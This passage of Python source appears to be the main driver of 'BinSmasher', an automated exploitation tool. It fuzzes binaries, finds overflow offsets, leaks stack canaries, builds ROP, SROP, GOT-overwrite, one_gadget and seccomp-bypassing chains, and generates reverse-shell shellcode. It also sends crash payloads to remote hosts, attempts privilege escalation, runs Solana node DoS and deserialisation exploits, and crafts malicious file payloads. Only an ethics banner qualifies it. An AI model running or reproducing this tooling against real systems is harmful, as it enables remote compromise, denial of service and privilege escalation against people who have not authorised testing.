            stack_overflow = True
            rip_top = (coredump_rip >> 40) & 0xff
            log.info(f"RIP={hex(coredump_rip)} not cyclic — copy crashed before return")
            if rip_top == 0x7f:
                log.info("  RIP in shared library range → copy function crash (stack overflow)")
            log.info(f"  Stack overflow: send exactly offset+chain bytes "
                     f"(< {min_crash}B) to let copy complete and hit ret addr")
    else:
        stack_overflow = True  # assume stack overflow when no core available

    libc_path = _find_libc_path()
    if not libc_path:
        log.error("Cannot locate libc on disk — exploit impossible")
        return False, None

    # ── Strategy A: ret2system ROP ───────────────────────────────────────────
    if stack_overflow:
        log.info("Strategy A: stack overflow → ret2system ROP chain")
        success, etype = _attempt_rop_system(
            cfg, fuzzer, ret_addr_offset, min_crash,
            pie_base, libc_base, bad_bytes, libc_path)
        if success:
            return True, etype

    # ── Strategy B: SROP ─────────────────────────────────────────────────────
    if stack_overflow:
        log.info("Strategy B: SROP (Sigreturn-Oriented Programming)")
        success, etype = _attempt_srop(
            cfg, fuzzer, ret_addr_offset, min_crash,
            pie_base, libc_base, bad_bytes, libc_path)
        if success:
            return True, etype

    # ── Strategy C: GOT overwrite ─────────────────────────────────────────────
    if ptr_overwrite:
        log.info("Strategy C: ptr-overwrite → GOT overwrite")
        success, etype = _attempt_got_overwrite(
            cfg, fuzzer, min_crash,
            pie_base, libc_base, bad_bytes, libc_path)
        if success:
            return True, etype

    # ── Strategy D: ret2win (CTF win function) ────────────────────────────────
    if stack_overflow:
        log.info("Strategy D: ret2win (direct call to win/flag/shell function)")
        success, etype = _attempt_ret2win(
            cfg, fuzzer, ret_addr_offset, min_crash,
            pie_base, bad_bytes)
        if success:
            return True, etype

    # ── Strategy E: one_gadget (libc magic gadget) ───────────────────────────
    if stack_overflow:
        log.info("Strategy E: one_gadget (libc execve magic gadget)")
        success, etype = _attempt_one_gadget(
            cfg, fuzzer, ret_addr_offset, min_crash,
            pie_base, libc_base, bad_bytes, libc_path)
        if success:
            return True, etype

    # ── Strategy F: ORW chain (seccomp sandbox bypass) ───────────────────────
    # Only attempted when execve is blocked by seccomp and we have a viable offset.
    if stack_overflow and getattr(cfg, "force_orw", False):
        log.info("Strategy F: ORW chain (open/read/write flag)")
        success, etype = _attempt_orw(
            cfg, fuzzer, ret_addr_offset, min_crash,
            pie_base, libc_base, bad_bytes, libc_path)
        if success:
            return True, etype

    return False, None


# ── main binary run ──────────────────────────────────────────────────────────

def run_binary(cfg):
    global log
    analyzer = BinaryAnalyzer(cfg.binary, cfg.log_file)
    platform, arch = analyzer.setup_context()

    findings, target_function, functions = analyzer.static_analysis()
    if not functions:
        log.error("No functions detected — cannot proceed.")
        print_summary(None, None, None, "None", "Failed", None, None,
                      ["Run: r2 -c afl <binary> to verify functions"])
        return

    (stack_exec, nx, aslr, canary_enabled,
     relro, safeseh, cfg_flag, fortify, pie, shadow_stack) = analyzer.check_protections()

    fuzzer    = Fuzzer(cfg.binary, cfg.host, cfg.port, cfg.log_file, platform)
    exploiter = ExploitGenerator(cfg.binary, platform, cfg.host, cfg.port,
                                  cfg.log_file, cfg.tls, cfg.binary_args)

    if cfg.afl_fuzz:      fuzzer.afl_fuzz(cfg.binary_args_list, timeout_sec=cfg.afl_timeout)
    if cfg.mutation_fuzz: fuzzer.mutation_fuzz()
    if cfg.fuzz:          fuzzer.fuzz_target(cfg.file_input, cfg.protocol, cfg.binary_args_list)
    if cfg.frida:         analyzer.frida_analyze(cfg.binary_args_list)

    lib_name, lib_version, offsets, base_addr = analyzer.load_library_offsets()

    # Parse bad bytes from CLI (protocol-dependent, user-supplied)
    bad_bytes: set = set()
    if getattr(cfg, "bad_bytes_str", ""):
        raw = cfg.bad_bytes_str.replace("\\x", "").replace("0x", "").replace(" ", "")
        try:
            bad_bytes = set(bytes.fromhex(raw))
            log.info(f"Bad bytes: {[hex(b) for b in sorted(bad_bytes)]}")
        except Exception as exc:
            log.warning(f"Could not parse --bad-bytes '{cfg.bad_bytes_str}': {exc}")

    # ── Offset detection ─────────────────────────────────────────────────────
    udp_spawn_mode = bool(cfg.payload_data and cfg.udp and cfg.spawn_target)
    pie_base_udp   = None

    if udp_spawn_mode:
        log.info("UDP+spawn mode: offset detection via cyclic injection in payload template…")
        offset, pie_base_udp, target_function = fuzzer.find_offset_udp_payload(
            payload_template=cfg.payload_data.encode("utf-8", errors="surrogateescape"),
            binary=cfg.binary,
            binary_args=cfg.binary_args_list,
            pattern_size_start=cfg.pattern_size,
            target_function=target_function,
        )
        stack_addr = None
        if pie_base_udp:
            log.info(f"Process PIE base: {hex(pie_base_udp)}")
        libc_base_udp = getattr(fuzzer, "_last_libc_base", None)
        if libc_base_udp:
            log.info(f"Process libc base: {hex(libc_base_udp)}")
    else:
        if cfg.payload_data:
            log.info("Sending custom payload (crash confirmation)…")
            fuzzer.send_raw_payload(
                cfg.payload_data.encode("utf-8", errors="surrogateescape"),
                use_udp=cfg.udp,
            )
        offset, stack_addr, target_function = exploiter.find_offset(
            cfg.pattern_size, functions, retries=5)

    suggestions = []
    if offset is None:
        suggestions += [
            f"Verify binary is running: nc -zvu {cfg.host} {cfg.port}",
            "Add --spawn-target so BinSmasher manages the process",
            f"Inspect functions: r2 -c afl {cfg.binary}",
        ]
        log.error("Could not determine offset.")
        print_summary(None, None, None, "None", "Failed", None, target_function,
                      suggestions, nx=nx, pie=pie, relro=relro,
                      canary_enabled=canary_enabled, aslr=aslr)
        return

    is_fork = False
    if not udp_spawn_mode:
        is_fork = exploiter._detect_fork_server()

    canary = None
    if canary_enabled and not udp_spawn_mode:
        canary = exploiter.leak_canary(brute_force=is_fork)
        if not canary:
            suggestions.append("Canary leak failed — increase fmt string index range")

    if cfg.dos_only:
        crash_payload  = exploiter.generate_crash_payload(offset)
        crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
        exploit_script = exploiter.generate_exploit_script(
            offset, canary, base_addr, offsets, exploit_type="auto", binary_path=cfg.binary)
        console.print(Panel(
            f"Crash payload: [cyan]{len(crash_payload)}[/] bytes\n"
            f"Crash script:  [green]{crash_script}[/]\n"
            f"Exploit script:[green]{exploit_script}[/]",
            title="DOS / Script Generation", border_style="yellow"))
        if cfg.test_exploit:
            from pwn import remote
            try:
                conn = remote(cfg.host, cfg.port, timeout=5)
                conn.sendline(crash_payload)
                try:
                    conn.recvall(timeout=2)
                except Exception:
                    pass
                conn.close()
                log.info("Crash payload sent — target should have crashed")
            except Exception as exc:
                log.warning(f"Crash send failed: {exc}")
        print_summary(offset, stack_addr, None, "dos_crash", "Success",
                      canary, target_function, suggestions,
                      nx=nx, pie=pie, relro=relro,
                      canary_enabled=canary_enabled, aslr=aslr)
        return

    fmt_payload = None
    if findings["format_string_functions"] and not udp_spawn_mode:
        fmt_payload = exploiter.generate_format_string_payload(offset, relro)

    if cfg.return_addr:
        return_addr = int(cfg.return_addr, 16)
    elif udp_spawn_mode and pie_base_udp:
        return_addr = 0
    elif stack_addr:
        return_addr = stack_addr + cfg.return_offset
    else:
        return_addr = 0

    shellcode = None
    if not fmt_payload and not cfg.force_srop and not cfg.force_orw:
        shellcode = exploiter.generate_shellcode(cfg.cmd, cfg.output_ip, cfg.output_port,
                                                  arch, cfg.reverse_shell)
        if cfg.file_input:
            exploiter.craft_file_payload(cfg.file_input, offset, shellcode or b"\x90" * 16)
        if not shellcode:
            log.error("Shellcode generation failed.")
            print_summary(offset, stack_addr, return_addr, "None", "Failed",
                          canary, target_function, suggestions,
                          nx=nx, pie=pie, relro=relro,
                          canary_enabled=canary_enabled, aslr=aslr)
            return

    if cfg.heap_exploit and findings["heap_functions"]:
        exploiter.create_heap_exploit(offset, base_addr, offsets, lib_version or "2.31")
    if findings["heap_functions"]:
        exploiter.create_uaf_exploit(offset, base_addr, offsets)

    success, exploit_type, used_function = exploiter.create_exploit(
        offset=offset, shellcode=shellcode, return_addr=return_addr,
        test_exploit=False,
        return_offset=cfg.return_offset,
        nx=nx, aslr=aslr, canary_enabled=canary_enabled,
        format_string_payload=fmt_payload, functions=functions, file_input=cfg.file_input,
        canary=canary, relro=relro, safeseh=safeseh, cfg=cfg_flag,
        findings=findings, base_addr=base_addr, offsets=offsets,
        libc_version=lib_version or "2.31", pie=pie,
        force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)

    # ── UDP+spawn exploit delivery ────────────────────────────────────────────
    if udp_spawn_mode and cfg.payload_data:
        min_crash    = getattr(fuzzer, "_last_min_crash_sz", offset + 8)
        coredump_rip = getattr(fuzzer, "_last_coredump_rip", 0)

        if pie_base_udp and libc_base_udp:
            success, exploit_type = _run_udp_spawn_exploit(
                cfg=cfg,
                fuzzer=fuzzer,
                offset=offset,
                pie_base=pie_base_udp,
                libc_base=libc_base_udp,
                coredump_rip=coredump_rip,
                min_crash=min_crash,
                bad_bytes=bad_bytes,
            )
        else:
            log.warning("Cannot exploit: PIE base or libc base not available")
            success = False

        if not success:
            log.error(
                "Exploit delivery failed. Diagnostic:\n"
                f"  offset={offset}  min_crash={min_crash}  "
                f"pie={hex(pie_base_udp or 0)}  libc={hex(libc_base_udp or 0)}\n"
                f"  coredump_rip={hex(coredump_rip)}\n"
                f"  Run: coredumpctl debug <PID> to inspect manually"
            )

    elif cfg.test_exploit and not udp_spawn_mode:
        success, exploit_type, used_function = exploiter.create_exploit(
            offset=offset, shellcode=shellcode, return_addr=return_addr,
            test_exploit=True, return_offset=cfg.return_offset,
            nx=nx, aslr=aslr, canary_enabled=canary_enabled,
            format_string_payload=fmt_payload, functions=functions, file_input=cfg.file_input,
            canary=canary, relro=relro, safeseh=safeseh, cfg=cfg_flag,
            findings=findings, base_addr=base_addr, offsets=offsets,
            libc_version=lib_version or "2.31", pie=pie,
            force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)

    if cfg.cfi_bypass:
        log.info("Attempting CFI bypass…")
        cfi_chain = exploiter.cfi_bypass(offset, canary)
        if cfi_chain:
            log.info(f"CFI bypass chain ready: {len(cfi_chain)} bytes")

    if platform == "windows":
        if cfg.safeseh_bypass:
            exploiter.create_safeseh_bypass(offset, safeseh)
        if cfg_flag == "Enabled":
            exploiter.cfg_bypass(offset)

    if success and cfg.privilege_escalation:
        exploiter.attempt_privilege_escalation()

    if cfg.generate_scripts:
        crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
        exploit_script = exploiter.generate_exploit_script(
            offset, canary, base_addr, offsets,
            exploit_type=exploit_type, binary_path=cfg.binary)
        try:
            from pwn import ELF as _e2
            elf2 = _e2(cfg.binary, checksec=False)
            WIN_KW = ["win", "flag", "shell", "backdoor", "secret", "easy", "print_flag", "cat_flag"]
            win = next((_a for _n, _a in elf2.symbols.items()
                        if _a and any(kw == _n.lower() or _n.lower().startswith(kw) for kw in WIN_KW)), 0)
            gdb_f = fuzzer.generate_gdb_script(cfg.binary, offset, win_addr=win,
                                                mode=getattr(cfg, "gdb_mode", "pwndbg"))
            log.info(f"GDB script: {gdb_f}")
        except Exception as exc:
            log.debug(f"GDB script: {exc}")
        log.info(f"Scripts written: {crash_script}, {exploit_script}")

    if success:
        suggestions.append("Exploit sent — verify output on your listener")
    else:
        suggestions += [
            "Try --heap-exploit for heap-based vulnerabilities",
            "Try --mutation-fuzz to find additional crash inputs",
            "Try --srop to force Sigreturn-Oriented Programming chain",
            "Try --orw if target has seccomp sandbox blocking execve",
            "Try --ret2win for direct win function call",
            "Use gdb/r2 to inspect memory and verify offsets",
            "Increase --return-offset for ASLR brute",
        ]

    display_return_addr = return_addr
    if exploit_type == "ret2win" and (not display_return_addr or display_return_addr < 0x1000):
        try:
            from pwn import ELF as _ELF
            WIN_KW = ["win", "flag", "shell", "backdoor", "secret", "easy", "print_flag", "cat_flag"]
            elf = _ELF(cfg.binary, checksec=False)
            for name, addr in elf.symbols.items():
                if addr and any(kw == name.lower() or name.lower().startswith(kw) for kw in WIN_KW):
                    display_return_addr = addr
                    break
        except Exception:
            pass

    print_summary(offset, stack_addr, display_return_addr, exploit_type,
                  "Success" if success else "Failed",
                  canary, used_function or target_function, suggestions,
                  nx=nx, pie=pie, relro=relro,
                  canary_enabled=canary_enabled, aslr=aslr)


def run_solana(args):
    fuzzer = Fuzzer(args.binary or "/dev/null", args.host, args.port, args.log_file, "linux")
    if args.source_path and args.binary:
        analyzer = BinaryAnalyzer(args.binary, args.log_file)
        analyzer.grep_unsafe_source(args.source_path)
    if args.bpf_fuzz or args.agave_exploit_type == "svm-bpf":
        fuzzer.fuzz_bpf(args.solana_rpc)
    etype = args.agave_exploit_type
    if etype == "deser":
        fuzzer.exploit_deser(args.solana_rpc)
    elif etype == "dos-quic":
        fuzzer.dos_quic()
    elif etype == "snapshot-assert":
        fuzzer.exploit_snapshot_assert(args.solana_rpc)
    log.info("Solana/Agave audit completed.")


def run_file(args):
    global log
    from file_exploiter import FileExploiter
    fe = FileExploiter(output_dir=args.output_dir)
    sc = None
    if args.shellcode_hex:
        try:
            sc = bytes.fromhex(args.shellcode_hex.replace("\\x", "").replace("0x", ""))
        except Exception as exc:
            log.error(f"Invalid shellcode hex: {exc}")
            return
    if args.all_formats:
        results = fe.craft_all(args.offset, sc, args.technique)
        console.print(Panel(f"Generated {len(results)} payloads in {args.output_dir}/",
                             title="File Exploiter", border_style="cyan"))
        for _, path in results:
            console.print(f"  [green]→[/] {path}")
    else:
        payload, path = fe.craft(args.format, args.offset, sc, args.technique)
        console.print(Panel(f"Payload: {path}\nSize: {len(payload)} bytes\n"
                            f"Format: {args.format}\nTechnique: {args.technique}",
                             title="File Exploiter", border_style="cyan"))


def main():
    global log
    parser = build_parser()
    args   = parser.parse_args()
    console.print(Panel(get_banner(), title="BinSmasher 🔨", border_style="cyan"))
    console.print(Panel(
        "[bold yellow]WARNING[/]: Use only on systems you own or have "
        "explicit written authorization to test.\nUnauthorized access is illegal.",
        title="⚠️  Ethics Notice", border_style="yellow"))

    if args.mode == "binary":
        cfg = ExploitConfig(
            binary=args.binary, host=args.host, port=args.port,
            pattern_size=args.pattern_size, return_addr=args.return_addr,
            return_offset=args.return_offset, test_exploit=args.test_exploit,
            log_file=args.log_file, output_ip=args.output_ip, output_port=args.output_port,
            reverse_shell=args.reverse_shell, cmd=args.cmd, fuzz=args.fuzz,
            afl_fuzz=args.afl_fuzz, frida=args.frida, file_input=args.file_input,
            protocol=args.protocol, tls=args.tls, heap_exploit=args.heap_exploit,
            safeseh_bypass=args.safeseh_bypass, privilege_escalation=args.privilege_escalation,
            binary_args=args.binary_args, afl_timeout=args.afl_timeout,
            mutation_fuzz=args.mutation_fuzz, cfi_bypass=args.cfi_bypass,
            force_srop=args.force_srop, force_orw=args.force_orw, flag_path=args.flag_path,
            dos_only=args.dos, generate_scripts=args.generate_scripts,
            payload_data=args.payload_data, udp=args.udp,
            spawn_target=args.spawn_target)
        # Attach bad_bytes_str (not in ExploitConfig dataclass — store as dynamic attr)
        cfg.bad_bytes_str = getattr(args, "bad_bytes", "")
        log = setup_logging(cfg.log_file)
        cfg.validate()
        run_binary(cfg)
    elif args.mode == "solana":
        log = setup_logging(args.log_file)
        run_solana(args)
    elif args.mode == "file":
        log = setup_logging(args.log_file)
        run_file(args)


if __name__ == "__main__":
    main()
